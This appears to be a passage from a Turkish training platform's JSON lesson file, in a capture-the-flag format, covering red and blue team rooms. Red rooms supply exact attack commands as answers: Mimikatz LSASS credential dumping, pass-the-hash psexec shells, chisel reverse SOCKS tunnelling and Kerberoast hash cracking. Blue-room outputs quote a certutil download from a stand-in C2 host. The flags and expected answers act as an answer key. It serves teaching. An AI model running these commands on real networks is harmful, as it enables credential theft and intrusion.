        "title": "Bellek İstismarı: Mimikatz & LSASS Dump Parola Avcılığı",
        "level": "3. Red Team Yetkinlikleri",
        "badge": "LSASS MEMORY & CREDENTIAL DUMP",
        "theory": "### Belleğin Gizli Odası: LSASS ve Açık Parolalar\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nOtel resepsiyonundaki görevli, müşterilerin anahtarlarını daha sonra hızlıca bulabilmek için masanın çekmecesine koyar. Mimikatz, o çekmeceye elini daldırıp lobide oturum açmış herkesin oda anahtarını (NTLM hash ve Kerberos biletleri) cebine dolduran araçtır.\n\n#### LSASS Korumaları ve Bypass:\nModern Windows sistemlerde LSASS koruması (RunAsPPL) olsa dahi, Red Team uzmanları mini-dump (Procdump, comsvcs.dll) veya kernel sürücüleri ile belleği diske döküp çevrimdışı Mimikatz ile analiz edebilir.",
        "mission": "Mimikatz ile SeDebugPrivilege yetkisini alıp oturum açmış kullanıcıların kimlik bilgilerini bellekten dökmek için mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit komutunu çalıştırın.",
        "expectedCommand": "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit",
        "acceptedCommands": [
                "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit",
                "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
                "mimikatz privilege::debug sekurlsa::logonpasswords exit"
        ],
        "hintExplanation": "<p><strong>privilege::debug:</strong> İşletim sistemi çekirdek proseslerine dokunma yetkisini aktifleştirir.</p><p><strong>sekurlsa::logonpasswords:</strong> LSASS belleğindeki aktif NTLM hash'lerini ve açık metin parolaları listeler.</p>",
        "terminalSuccessOutput": "  .#####.   mimikatz 2.2.0 (x64) # release\n ## ^ ##    \"A La Vie, A L'Amour\"\nPrivilege '20' OK\nAuthentication Id : 0 ; 249124 (00000000:0003cd24)\nUser Name         : Administrator\nDomain            : CORP\n * NTLM : b4b9b02e6f09a9bd760f388b67351e2b\n[KRİTİK BAŞARI] Administrator kullanıcısının NTLM hash'i LSASS'tan çekildi!\n[FLAG] LFL{red_mimikatz_lsass_passwords_dumped}",
        "flag": "LFL{red_mimikatz_lsass_passwords_dumped}",
        "nextId": "red-309"
},
    {
        "id": "red-309",
        "track": "red",
        "title": "Ağ İçi Yatay Geçiş: Pass-the-Hash & Impacket psexec",
        "level": "3. Red Team Yetkinlikleri",
        "badge": "PASS-THE-HASH & LATERAL MOVEMENT",
        "theory": "### Parolayı Kırmaya Gerek Yok: Hash ile Oturum Açma (PtH)\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nKasanın şifresinin ne olduğunu bilmenize gerek yoktur. Şifreyi temsil eden onay damgasını elinize geçirip kapıdaki kontrolöre gösterdiğinizde kapı açılır. NTLM protokolünde sunucu açık metin parolayı değil, hash'i doğrular.\n\n#### Impacket psexec:\nEle geçirilen `Administrator` NTLM hash'i doğrudan SMB üzerinden diğer hedef sunucuya iletilerek o makinede `SYSTEM` yetkisinde uzaktan komut kabuğu (shell) açılır.",
        "mission": "Ele geçirilen NTLM hash'ini kullanarak iç ağdaki 10.10.10.50 sunucusuna Pass-the-Hash ile bağlanıp whoami çalıştırmak için impacket-psexec -hashes :b4b9b02e6f09a9bd760f388b67351e2b Administrator@10.10.10.50 whoami komutunu çalıştırın.",
        "expectedCommand": "impacket-psexec -hashes :b4b9b02e6f09a9bd760f388b67351e2b Administrator@10.10.10.50 whoami",
        "acceptedCommands": [
                "impacket-psexec -hashes :b4b9b02e6f09a9bd760f388b67351e2b Administrator@10.10.10.50 whoami",
                "psexec.py -hashes :b4b9b02e6f09a9bd760f388b67351e2b Administrator@10.10.10.50 whoami",
                "impacket-psexec -hashes :b4b9b02e6f09a9bd760f388b67351e2b Administrator@10.10.10.50"
        ],
        "hintExplanation": "<p><strong>impacket-psexec:</strong> Windows SMB servisleri üzerinden servis yükleyip kabuk açar.</p><p><strong>-hashes:</strong> Açık parola yerine NTLM hash ile giriş yapmayı sağlar.</p>",
        "terminalSuccessOutput": "[*] Requesting shares on 10.10.10.50.....\n[*] Found writable share ADMIN$\n[*] Uploading file kxLq.exe.....\n[*] Opening SVCManager on 10.10.10.50.....\n[*] Creating service kxLq on 10.10.10.50.....\n[*] Starting service kxLq.....\nnt authority\\system\n[YATAY GEÇİŞ BAŞARILI] 10.10.10.50 sunucusu SYSTEM yetkisiyle ele geçirildi!\n[FLAG] LFL{red_pass_the_hash_lateral_movement_success}",
        "flag": "LFL{red_pass_the_hash_lateral_movement_success}",
        "nextId": "red-310"
},
    {
        "id": "red-310",
        "track": "red",
        "title": "Ağ Pivotlama: Chisel & SOCKS5 Tünelleme ile İç Ağ Fethi",
        "level": "3. Red Team Yetkinlikleri",
        "badge": "NETWORK PIVOTING & SOCKS5",
        "theory": "### Görünmez Ağlara Ulaşmak: Pivotlama (Pivoting)\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nDışarıdan yalnızca oturma odasının penceresini görebiliyorsunuz. Ancak oturma odasına bir telsiz (Chisel Client) kurup telsizi kendi kulaklığınıza (Chisel Server) bağlarsanız, oturma odasından arka yatak odasına seslenebilirsiniz.\n\n#### Chisel HTTP Tünelleme:\nFirewall giden tüm portları kapatsa bile genellikle port 80 veya 443'e izin verir. Chisel bu HTTP tüneli içine tam teşekküllü bir SOCKS5 proxy sığdırarak Kali makinenizdeki `nmap` veya `burp`'un iç ağdaki 172.16.0.0/24 bloklarını taramasını sağlar.",
        "mission": "DMZ sunucusundan kendi saldırı makinenize tersine SOCKS5 proxy tüneli açmak için chisel client 10.10.10.5:8000 R:socks komutunu çalıştırın.",
        "expectedCommand": "chisel client 10.10.10.5:8000 R:socks",
        "acceptedCommands": [
                "chisel client 10.10.10.5:8000 R:socks",
                "chisel client 10.10.10.5:8000 R:1080:socks",
                "./chisel client 10.10.10.5:8000 R:socks"
        ],
        "hintExplanation": "<p><strong>chisel client:</strong> Ele geçirilen hedef makinede çalıştırılan istemcidir.</p><p><strong>R:socks:</strong> Sunucu tarafında 1080 numaralı yerel SOCKS5 proxy portu açar.</p>",
        "terminalSuccessOutput": "2026/11/08 21:05:10 client: Connecting to ws://10.10.10.5:8000\n2026/11/08 21:05:11 client: Handshaking...\n2026/11/08 21:05:11 client: Sending config\n2026/11/08 21:05:11 client: Connected (Latency 1.4ms)\n2026/11/08 21:05:11 client: SOCKS5 tunnel established on 127.0.0.1:1080\n[TÜNEL DEVREDE] Artık proxychains ile iç ağdaki izole veritabanları taranabilir!\n[FLAG] LFL{red_pivoting_chisel_socks5_internal_network_unlocked}",
        "flag": "LFL{red_pivoting_chisel_socks5_internal_network_unlocked}",
        "nextId": "red-311"
},
    {
        "id": "red-311",
        "track": "red",
        "title": "Parola Kırma: Hashcat ile Kerberoasting TGS Offline Crack",
        "level": "3. Red Team Yetkinlikleri",
        "badge": "GPU HASHCAT CRACKING",
        "theory": "### Matematiksel Güç: GPU Destekli Hash Kırma\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nElinizde bir banka kasasının şifreli anahtarı var ama anahtarın dişleri mühürlü. Korumalar sizi görmesin diye anahtarı kendi garajınıza getirip saniyede 5 milyar deneme yapan hidrolik lazer makinenizle (GPU) kırana kadar test etmek gibidir.\n\n#### Hashcat Modları:\nKerberoasting ile çekilen TGS biletleri Kerberos 5 TGS-REP etype 23 formatındadır (`-m 13100`). Hashcat GPU çekirdeklerini kullanarak RockYou sözlüğündeki parolaları bu biletle saniyeler içinde eşleştirir.",
        "mission": "Ele geçirilen tgs_ticket.hash dosyasını RockYou sözlüğüyle kırmak için hashcat -m 13100 -a 0 tgs_ticket.hash /usr/share/wordlists/rockyou.txt komutunu çalıştırın.",
        "expectedCommand": "hashcat -m 13100 -a 0 tgs_ticket.hash /usr/share/wordlists/rockyou.txt",
        "acceptedCommands": [
                "hashcat -m 13100 -a 0 tgs_ticket.hash /usr/share/wordlists/rockyou.txt",
                "hashcat -m 13100 tgs_ticket.hash /usr/share/wordlists/rockyou.txt",
                "hashcat -m 13100 -a 0 tgs_ticket.hash rockyou.txt"
        ],
        "hintExplanation": "<p><strong>-m 13100:</strong> Kerberos 5 TGS-REP etype 23 hash formatını seçer.</p><p><strong>-a 0:</strong> Düz sözlük (Dictionary) saldırı modudur.</p>",
        "terminalSuccessOutput": "hashcat (v6.2.6) starting in benchmark mode...\nSpeed.#1.........: 1240.2 MH/s (52.12ms)\n$krb5tgs$23$*sql_svc$CORP.LOCAL*$tgs_ticket...:Summer2026!Password\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Name........: Kerberos 5 TGS-REP etype 23\nCandidates.#1....: 14344384/14344384 (100.00%)\n[PAROLA KIRILDI] sql_svc servis hesabının parolası bulundu: Summer2026!Password\n[FLAG] LFL{red_hashcat_kerberoast_password_cracked}",
        "flag": "LFL{red_hashcat_kerberoast_password_cracked}",
        "nextId": "red-312"
},
    {
        "id": "red-312",
        "track": "red",
        "title": "Red Team Zirvesi: Full Domain Compromise & Tahtın Fethi",
        "level": "3. Red Team Yetkinlikleri",
        "badge": "DOMAIN TAKEOVER & GOLDEN TICKET",
        "theory": "### Ofansif Operasyonun Zirvesi: Krallığın Düşüşü\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nKalenin dış kapısındaki çatlaktan (Web zafiyeti) girdiniz, nöbetçiyi atlattınız (Yetki yükseltme), vezirin ceketinden anahtarları aldınız (Pass-the-Hash) ve şimdi kralın taht odasında sarayın tapusunu (Domain Controller & Golden Ticket) mühürlediniz. Red Team operasyonu tamamlandı.\n\n#### 20 Red Team Odasını Tamamladınız!\nWeb sızma testinden, EDR bypass tekniklerine, Active Directory saldırı zincirlerinden C2 komuta kontrol altyapılarına kadar tam donanımlı bir ofansif güvenlik uzmanı oldunuz.",
        "mission": "Domain Controller sunucusundaki nihai zafer bayrağını okumak için cat /root/flags/domain_compromise_final.txt komutunu çalıştırın.",
        "expectedCommand": "cat /root/flags/domain_compromise_final.txt",
        "acceptedCommands": [
                "cat /root/flags/domain_compromise_final.txt",
                "cat domain_compromise_final.txt",
                "more /root/flags/domain_compromise_final.txt"
        ],
        "hintExplanation": "<p><strong>domain_compromise_final.txt:</strong> 20 odalık Red Team patikasını tamamladığınızda açılan nihai bayraktır.</p>",
        "terminalSuccessOutput": "========================================================================\n👑 TEBRİKLER! RED TEAM OFANSİF OPERASYON PATİKASINI FETHETTİNİZ! 👑\n========================================================================\n[KAZANILAN OFANSİF YETKİNLİKLER]:\n✔ Ağ & Web Sızma: SSRF, Blind SQLi, Metasploit & Exploit Zinciri\n✔ Yetki Yükseltme & Bypass: Linux SUID, Windows Token, EDR Hook Bypass\n✔ Active Directory Hakimiyeti: Kerberoasting, BloodHound, Mimikatz, PtH\n✔ İleri Düzey Operasyonlar: Chisel Pivotlama, GPU Hashcat, C2 Sliver/Cobalt\n\n[RED TEAM NİHAİ BAYRAĞI]: LFL{red_full_domain_compromise_crown_captured}\n========================================================================",
        "flag": "LFL{red_full_domain_compromise_crown_captured}",
        "nextId": "blue-101"
},
    {
        "id": "blue-101",
        "track": "blue",
        "title": "Gelişmiş Günlük Yönetimi: Linux Syslog & Auth Logs",
        "level": "1. Temel Altyapı ve İzleme",
        "badge": "LOG ARCHITECTURE & EVENT IDS",
        "theory": "### Savunmanın Temeli: Normal Davranışı Bilmek\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir binanın girişindeki güvenlik kulübesinde duran ziyaretçi defteridir. Kim geldi, saat kaçta geldi, hangi kapıyı zorladı? Defterde gece saat 03:00'te aynı kişinin 100 kere yanlış anahtar denediğini görürseniz bu bir hırsızlık teşebbüsüdür!\n\nSavunma yapabilmek için neyi koruduğunuzu ve normal sistem davranışının ne olduğunu bilmeniz gerekir.\n\n#### 1. Windows Event Logs & Kritik Event ID'ler:\n* **Event ID 4624 / 4625:** Başarılı / Başarısız oturum açma.\n* **Event ID 4672:** Yönetici (Special Privileges) haklarıyla oturum açıldığında üretilir.\n* **Event ID 7045:** Sisteme yeni bir Windows servisi kurulduğunda tetiklenir.\n\n#### 2. Linux Syslog Mimarisi:\n* `/var/log/auth.log`: Kimlik doğrulama, SSH ve sudo aktiviteleri.\n* `/var/log/syslog`: Çekirdek ve servislerin genel olay akışı.",
        "mission": "Linux kimlik doğrulama günlüğünde (/var/log/auth.log) başarısız olan (Failed password) SSH oturum açma denemelerini filtreleyin.",
        "expectedCommand": "grep \"Failed password\" /var/log/auth.log",
        "acceptedCommands": [
            "grep 'Failed password' /var/log/auth.log",
            "grep \"Failed password for\" /var/log/auth.log",
            "grep 'Failed password for' /var/log/auth.log",
            "cat /var/log/auth.log | grep \"Failed password\""
        ],
        "hintExplanation": "<p><strong>grep:</strong> Linux'ta devasa metin dosyaları içinde aradığınız kelimeyi saniyeler içinde bulan arama motorudur.</p>\n<p><strong>\"Failed password\":</strong> SSH sunucusunun yanlış şifre girildiğinde günlüğe yazdığı standart uyarıdır.</p>\n<p><strong>/var/log/auth.log:</strong> Linux sistemlerde kimin sisteme girmeye çalıştığını kaydeden güvenlik günlüğüdür.</p>",
        "terminalSuccessOutput": "[+] AUTH.LOG AYRIŞTIRILIYOR...\nNov 08 14:12:01 lfl-srv sshd[4201]: Failed password for root from 192.168.1.185 port 55432 ssh2\nNov 08 14:12:03 lfl-srv sshd[4204]: Failed password for root from 192.168.1.185 port 55434 ssh2\nNov 08 14:12:05 lfl-srv sshd[4208]: Failed password for invalid user admin from 192.168.1.185 port 55436 ssh2\n[ALERT] 192.168.1.185 adresinden kaba kuvvet (brute-force) saldırısı tespit edildi!\n[FLAG] LFL{blue_syslog_auth_bruteforce_isolated}",
        "flag": "LFL{blue_syslog_auth_bruteforce_isolated}",
        "nextId": "blue-102"
    },
    {
        "id": "blue-102",
        "track": "blue",
        "title": "Merkezi Log ve SIEM Mimarisi: Wazuh, Splunk & Elastic",
        "level": "1. Temel Altyapı ve İzleme",
        "badge": "SIEM & CENTRALIZED LOGGING",
        "theory": "### Dağınık Loglardan Anlam Çıkarmak: SIEM\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir hastanedeki 500 hastanın koluna tansiyon ve nabız sensörü takıp, başhekimin odasındaki tek bir dev ekranda nabzı yükselen hastanın odasının otomatik kırmızı alarm vermesini sağlamaktır.\n\nBir kurumda yüzlerce sunucu, firewall ve binlerce uç nokta varken logları tek tek makinelere girerek inceleyemezsiniz.\n\n#### 1. SIEM Bileşenleri:\n* **Log Toplayıcı (Forwarder):** Uç noktalardan logları merkeze iletir.\n* **Ayrıştırıcı (Parser):** Farklı kaynaklardan gelen logları ortak standarda dönüştürür.\n* **Korelasyon Motoru:** Bağımsız olayları birleştirerek saldırı senaryosu üretir.",
        "mission": "Splunk ortamında başarısız oturum açma olay kodunu (EventCode=4625) sorgulayarak hedef kullanıcı adlarına göre gruplayan SPL komutunu çalıştırın.",
        "expectedCommand": "index=windows EventCode=4625 | stats count by TargetUserName",
        "acceptedCommands": [
            "index=windows EventCode=4625",
            "index=windows EventCode=4625 | stats count",
            "EventCode=4625"
        ],
        "hintExplanation": "<p><strong>index=windows:</strong> Splunk içinde Windows makinelerden toplanan log havuzunu seçer.</p>\n<p><strong>EventCode=4625:</strong> Windows'un 'Yanlış Şifre Girildi / Oturum Açılamadı' olay kodudur.</p>\n<p><strong>| stats count by TargetUserName:</strong> Logları analiz motoruna aktarır ve hangi kullanıcı adına kaç kere yanlış şifre denendiğini sayıp listeler.</p>",
        "terminalSuccessOutput": "TargetUserName    count\n----------------  -----\nadministrator     1482\nsql_service       320\nguest             45\n[+] SIEM Korelasyonu Tetiklendi: High-Severity Brute Force Incident #9412\n[FLAG] LFL{siem_splunk_event4625_aggregated}",
        "flag": "LFL{siem_splunk_event4625_aggregated}",
        "nextId": "blue-103"
    },
    {
        "id": "blue-103",
        "track": "blue",
        "title": "Ağ Savunması ve İzleme (NSM): Snort, Suricata & Zeek",
        "level": "1. Temel Altyapı ve İzleme",
        "badge": "NETWORK SECURITY & IDS/IPS",
        "theory": "### Ağ Hattında Pusu: NSM ve İmza Tabanlı Tespit\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nHavalimanındaki X-Ray cihazıdır. Bavulun içindeki eşyaların röntgenine bakar, silah veya patlayıcıya benzeyen bir metal görürse cihaz öter (IDS) ve bavulun uçağa yüklenmesini engeller (IPS).\n\nAğ Güvenliği İzleme (Network Security Monitoring - NSM), kablodan geçen veriyi analiz ederek kötü niyetli paketleri hattan geçerken yakalar.\n\n#### 1. IDS (Tespit) vs IPS (Engelleme):\n* **IDS:** Trafiği pasif olarak dinler ve alarm üretir (Trafiği kesmez).\n* **IPS:** Trafiğin tam ortasında (inline) durur; zararlı paket algıladığında oturumu anında sonlandırır.",
        "mission": "Snort IDS motorunu yerel kural yapılandırması ve 'attack.pcap' paket analizi modunda çalıştırarak web shell yükleme girişimini yakalayın.",
        "expectedCommand": "snort -q -c /etc/snort/snort.conf -r attack.pcap",
        "acceptedCommands": [
            "snort -A console -q -c /etc/snort/snort.conf -r attack.pcap",
            "snort -c /etc/snort/snort.conf -r attack.pcap",
            "suricata -r attack.pcap"
        ],
        "hintExplanation": "<p><strong>snort:</strong> Ağ trafiğindeki zararlı paketleri imzalara bakarak tespit eden açık kaynak IDS sistemidir.</p>\n<p><strong>-q:</strong> 'Quiet' yani gereksiz başlangıç yazılarını gizler, sadece alarmları gösterir.</p>\n<p><strong>-c /etc/snort/snort.conf:</strong> Hangi saldırı kurallarının yükleneceğini belirten ana ayar dosyasıdır.</p>\n<p><strong>-r attack.pcap:</strong> Canlı ağ yerine kaydedilmiş şüpheli paket dosyasını baştan sona analiz eder.</p>",
        "terminalSuccessOutput": "08/11-15:02:11.412901 [**] [1:100005:1] LFL - Web Shell Giris Denemesi [**] [Priority: 1] {TCP} 10.0.0.88:41202 -> 192.168.1.10:80\n[DROP] Paket IPS motoru tarafından düşürüldü ve bağlantı kesildi.\n[FLAG] LFL{snort_suricata_nsm_signature_matched}",
        "flag": "LFL{snort_suricata_nsm_signature_matched}",
        "nextId": "blue-201"
    },
    {
        "id": "blue-201",
        "track": "blue",
        "title": "SOC Analistliği: Alarm Triyajı, True vs False Positive",
        "level": "2. Tehdit Avcılığı ve Analiz",
        "badge": "SOC OPERATIONS & TRIAGE",
        "theory": "### SOC Masasında Hayat: Gürültüyü Ayıklamak\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nEvinizin yangın alarmı yemek pişirirken çıkan ekmek kızartma dumanına ötüyorsa bu **False Positive (Yanlış Alarm)**'dır. Gerçekten perdeler tutuştuğunda ötüyorsa bu **True Positive (Gerçek Alarm)**'dır. Bir SOC analistinin en büyük görevi yanlış alarmlara vakit kaybetmeden gerçek yangınları anında tespit etmektir.\n\nGüvenlik Operasyon Merkezi (SOC) analisti her gün yüzlerce alarm alır. En kritik yetenek alarm triyajıdır.\n\n#### 1. Alarm Sınıflandırması:\n* **Gerçek Pozitif (True Positive):** Gerçekten bir saldırı var ve alarm doğru çaldı.\n* **Yanlış Pozitif (False Positive):** Saldırı yok ancak güvenlik kuralı meşru bir trafiği zararlı zannetti.",
        "mission": "SOC ekranına düşen şüpheli 185.220.101.5 IP adresinin tehdit itibar skorunu AbuseIPDB API sorgusu ile denetleyin.",
        "expectedCommand": "curl -s \"https://api.abuseipdb.com/check?ip=185.220.101.5\"",
        "acceptedCommands": [
            "curl -s https://api.abuseipdb.com/check?ip=185.220.101.5",
            "abuseipdb-check --ip 185.220.101.5 --threshold 80",
            "abuseipdb-check 185.220.101.5",
            "whois 185.220.101.5"
        ],
        "hintExplanation": "<p><strong>curl:</strong> Terminal üzerinden internetteki bir web adresine veya API'ye istek gönderme aracıdır.</p>\n<p><strong>-s:</strong> 'Silent' modu açar, gereksiz indirme yazılarını gizler ve doğrudan sonucu ekrana yazar.</p>\n<p><strong>api.abuseipdb.com:</strong> Dünyadaki siber güvenlik uzmanlarının şüpheli IP'leri ihbar ettiği küresel kara liste veritabanıdır.</p>",
        "terminalSuccessOutput": "[+] AbuseIPDB Raporu: 185.220.101.5\nKötüye Kullanım Güven Skoru: %100 (HIGH RISK)\nKategori: Tor Çıkış Düğümü / Web Saldırıları / Brute Force\nSon 24 Saatteki Rapor Sayısı: 421 Rapor\n[SONUÇ]: TRUE POSITIVE - Saldırgan IP derhal Firewall üzerinden bloklanmalıdır.\n[FLAG] LFL{soc_triage_true_positive_confirmed}",
        "flag": "LFL{soc_triage_true_positive_confirmed}",
        "nextId": "blue-202"
    },
    {
        "id": "blue-202",
        "track": "blue",
        "title": "Tehdit Avcılığı (Threat Hunting) & LOLBins",
        "level": "2. Tehdit Avcılığı ve Analiz",
        "badge": "THREAT HUNTING & MITRE ATT&CK",
        "theory": "### Alarm Beklemeyi Bırakın: Tehdit Avı\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nKapı alarmınız çalmadı diye evinizde hırsız olmadığını garanti edemezsiniz. Belki de hırsız gündüz vakti açık pencereden girip yatağın altına saklandı! Tehdit avcısı eline feneri alıp yatağın altına, dolapların arkasına (meşru görünen proseslere) bakar.\n\nTehdit Avcılığı (Threat Hunting), güvenlik sistemlerinin alarm vermediği durumlarda ağın içinde gizlice yaşayan (Living-off-the-Land) saldırganları proaktif olarak arama sürecidir.\n\n#### 1. LOLBins Kötüye Kullanımı:\n* **T1105 (Ingress Tool Transfer):** Meşru Windows ikili dosyalarının (certutil.exe, bitsadmin.exe) dosya indirmek için kötüye kullanılmasıdır.",
        "mission": "Saldırganların dosya indirmek için kötüye kullandığı meşru certutil prosesini Sysmon günlüklerinde arayarak gizli C2 indirme izini yakalayın.",
        "expectedCommand": "grep -i \"certutil.*urlcache\" /var/log/sysmon.log",
        "acceptedCommands": [
            "hunt-process --name certutil.exe --args '-urlcache'",
            "hunt-process certutil.exe",
            "grep -i certutil /var/log/sysmon.log"
        ],
        "hintExplanation": "<p><strong>grep -i:</strong> Büyük ve küçük harf farkı gözetmeksizin arama yapar.</p>\n<p><strong>\"certutil.*urlcache\":</strong> Normalde sertifika doğrulayan Windows aracı olan certutil'in internetten gizlice zararlı dosya indirmek için kullanılan argüman kalıbıdır (LOLBins).</p>\n<p><strong>/var/log/sysmon.log:</strong> Bilgisayarda çalışan tüm programların komut argümanlarını kaydeden gelişmiş log dosyasıdır.</p>",
        "terminalSuccessOutput": "[HUNTING ENGINE] Tehdit Avı Hipotezi: T1105 LOLBins Abuse\n[ANOMALİ TESPİT EDİLDİ]\nZaman: 11/08 14:48:19 | Host: FIN-WS-09 | Kullanıcı: corp\\ali\nProses: C:\\Windows\\System32\\certutil.exe\nArgümanlar: certutil.exe -urlcache -split -f http://evil-c2.lfl/payload.exe C:\\Temp\\update.exe\n[FLAG] LFL{threat_hunting_lolbins_certutil_exposed}",
        "flag": "LFL{threat_hunting_lolbins_certutil_exposed}",
        "nextId": "blue-203"
    },
    {
        "id": "blue-203",
        "track": "blue",
        "title": "Uç Nokta Güvenliği (EDR / XDR Mimarisi)",
        "level": "2. Tehdit Avcılığı ve Analiz",
        "badge": "EDR/XDR & TELEMETRY",
        "theory": "### Antivirüsün Evrimi: EDR ve XDR\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBinanın içinde serbestçe gezen bir kişinin yüzüne bakmak yerine hareketlerine bakmaktır: \"Bu adam kütüphaneye girdi ama kitap okumak yerine gizlice duvar prizini sökmeye çalışıyor!\" Word prosesinin altından PowerShell çıkması gibi anormal davranışlar anında tespit edilir.\n\nGeleneksel antivirüs yazılımları (AV) sadece diske yazılan dosyanın hash'ini kontrol eder. Ancak modern saldırılar bellekte yaşar (Fileless Malware) ve meşru sistem araçlarını kullanır.\n\n#### 1. EDR (Endpoint Detection and Response):\n* **Proses Ağacı (Process Tree):** Hangi prosesin kimi başlattığını izler. Örneğin: `WINWORD.EXE` (Word) kalkıp altında `powershell.exe` başlatıyorsa bu %99 zararlı bir makrodur.",
        "mission": "EDR telemetrisinde Word uygulamasının anormal alt proses başlatmasını (Parent-Child anomalisini) listeleyin.",
        "expectedCommand": "edr-cli query \"ParentImage:*WINWORD.EXE AND Image:*powershell.exe\"",
        "acceptedCommands": [
            "edr-query --parent WINWORD.EXE --child powershell.exe",
            "edr-query WINWORD.EXE",
            "edr-cli query WINWORD.EXE"
        ],
        "hintExplanation": "<p><strong>edr-cli query:</strong> Bilgisayarlara kurulu uç nokta ajanından (EDR) canlı proses sorgusu yapar.</p>\n<p><strong>ParentImage:*WINWORD.EXE:</strong> Anne prosesin Microsoft Word olduğunu belirtir.</p>\n<p><strong>Image:*powershell.exe:</strong> Çocuk prosesin PowerShell olduğunu belirtir. Bir Word belgesi hiçbir zaman arka planda gizlice komut satırı açmamalıdır; bu %100 zararlı makro saldırısıdır!</p>",
        "terminalSuccessOutput": "[EDR PROSES AĞACI ANALİZİ]\nParent: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE (PID: 5120)\n└── Child: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe (PID: 8192)\n    └── Komut: powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden (New-Object Net.WebClient)...\n[EDR ACTION]: Host izole edildi (Network Quarantine) | Proses ağacı sonlandırıldı.\n[FLAG] LFL{edr_telemetry_parent_child_anomaly}",
        "flag": "LFL{edr_telemetry_parent_child_anomaly}",
        "nextId": "blue-301"
    },
    {
        "id": "blue-301",
        "track": "blue",
        "title": "Olay Müdahalesi (Incident Response): İzolasyon",
        "level": "3. Olay Müdahalesi ve Adli Bilişim",
        "badge": "INCIDENT RESPONSE & PICERL",
        "theory": "### Alarm Çaldığında Panik Yok: Olay Müdahalesi (IR)\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nGrip olan bir hastayı diğer sağlıklı insanlardan ayırmak için karantinaya alırsınız. Sunucu hacklendiğinde ilk iş fişini çekip format atmak değil, ağ bağlantısını izole ederek virüsün diğer sunuculara sıçramasını engellemektir!\n\nBir siber güvenlik olayı gerçekleştiğinde ilk amaç sistemi hemen kapatmak DEĞİLDİR; çünkü bilgisayarı kapatmak uçucu bellekteki (RAM) en değerli saldırgan delillerini yok eder.\n\n#### 1. PICERL Metodolojisi (NIST / SANS):\n1. **Preparation:** Hazırlık.\n2. **Identification:** Tespit.\n3. **Containment (İzolasyon):** Saldırganın yana doğru hareketini (lateral movement) önlemek için enfekte makinenin ağ bağlantısının kesilmesi.\n4. **Eradication:** Yok etme.\n5. **Recovery:** Kurtarma.\n6. **Lessons Learned:** Çıkarılan dersler.",
        "mission": "Saldırı altında olan 192.168.1.120 IP'li sunucunun iç ağ ile olan iletişimini güvenlik duvarından keserek karantinaya alın.",
        "expectedCommand": "iptables -A INPUT -s 192.168.1.120 -j DROP",
        "acceptedCommands": [
            "ir-isolate --target 192.168.1.120 --block-all --allow-soc-ip 10.0.0.5",
            "isolate-host 192.168.1.120",
            "ufw deny from 192.168.1.120"
        ],
        "hintExplanation": "<p><strong>iptables:</strong> Linux çekirdeğinin dahili güvenlik duvarı (Firewall) yönetim komutudur.</p>\n<p><strong>-A INPUT:</strong> Gelen trafik kurallarına yeni bir güvenlik satırı ekle demektir.</p>\n<p><strong>-s 192.168.1.120:</strong> Karantinaya alınacak enfekte sunucunun IP adresidir.</p>\n<p><strong>-j DROP:</strong> Bu makineden gelen tüm paketleri çöpe at, ağ iletişimini anında dondur (karantinaya al) demektir.</p>",
        "terminalSuccessOutput": "[INCIDENT RESPONSE CONTROLLER]\n[+] Hedef: 192.168.1.120 ağ katmanında izole ediliyor...\n[+] Giden tüm TCP/UDP bağlantıları kesildi (DROP ALL).\n[+] Sadece SOC yönetim IP'si (10.0.0.5) adli inceleme için açık bırakıldı.\n[DURUM]: Karantina başarılı. Saldırganın C2 bağlantısı koptu!\n[FLAG] LFL{incident_response_host_isolation_active}",
        "flag": "LFL{incident_response_host_isolation_active}",
        "nextId": "blue-302"
    },
    {
        "id": "blue-302",
        "track": "blue",
        "title": "Dijital Adli Bilişim: RAM Analizi (Volatility)",
        "level": "3. Olay Müdahalesi ve Adli Bilişim",
        "badge": "DIGITAL FORENSICS & VOLATILITY",
        "theory": "### Belleğin Karakutusu: Uçucu Bellek (RAM) Adli Bilişimi\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir suç mahallinde katilin ayak izleri karda kalmıştır. Ancak güneş doğarsa kar erir ve izler yok olur. RAM de tıpkı o kardır; bilgisayarı kapattığınız anda içindeki şifreler silinir! Bu yüzden önce canlı RAM kopyası (memory dump) alınır.\n\nSaldırganlar artık diskte iz bırakmayan, sadece RAM'de çalışan zararlılar kullanmaktadır. Volatility, alınan bellek imajını analiz eden dünyanın 1 numaralı açık kaynak adli bilişim aracıdır.\n\n#### 1. Volatility Temel Eklentileri:\n* **windows.malfind:** Belleğe sonradan enjekte edilmiş (`PAGE_EXECUTE_READWRITE` izinli) şüpheli kod alanlarını ve PE başlıklarını (`MZ`) tespit eder.",
        "mission": "Kurban makineden alınan 'memdump.raw' bellek imajında gizlenmiş kod enjeksiyonlarını yakalamak için Volatility malfind eklentisini çalıştırın.",
        "expectedCommand": "vol -f memdump.raw windows.malfind",
        "acceptedCommands": [
            "vol.py -f memdump.raw windows.malfind",
            "python3 vol.py -f memdump.raw windows.malfind"
        ],
